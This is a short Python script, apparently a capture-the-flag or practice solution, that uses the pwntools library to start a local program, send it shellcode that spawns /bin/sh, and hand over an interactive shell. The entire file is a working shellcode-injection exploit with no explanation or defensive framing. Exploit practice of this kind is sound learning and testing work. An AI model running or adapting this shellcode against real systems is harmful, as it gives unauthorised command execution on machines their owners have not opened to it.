from pwn import *

p = process('./prog')
context.binary = p.elf

payload = asm(shellcraft.sh())

p.sendline(payload)
p.interactive()
